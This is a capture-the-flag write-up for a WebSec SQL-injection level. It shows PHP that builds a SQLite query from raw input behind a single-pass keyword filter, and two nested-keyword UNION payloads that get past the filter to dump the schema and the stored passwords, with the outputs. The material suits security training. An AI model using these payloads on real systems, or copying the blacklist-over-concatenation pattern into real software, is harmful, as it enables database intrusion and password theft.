The following keywords were found to be filtered by the application using preg_replace (): union, order, select, from, group, by
```
class LevelTwo {
    public function doQuery($injection) {
        $pdo = new SQLite3('leveltwo.db', SQLITE3_OPEN_READONLY);

        $searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');
        $injection = preg_replace ('/' . $searchWords . '/i', '', $injection);

        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query ($query);
        $users = $getUsers->fetchArray (SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}
```

STEP 1: 0 UNIUNIONON SELSELECTECT 1,sql FROFROMM sqlite_master--
OUTPUT: Other User Details: 
        id -> 1
        username -> CREATE TABLE users(id int(7), username varchar(255), password varchar(255))
        (Columns)

STEP 2: 0 UNIUNIONON SELSELECTECT 1, GROGROUPUP_CONCAT(password) FROFROMM users--
OUTPUT: Other User Details: 
      id -> 1
      username -> WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}
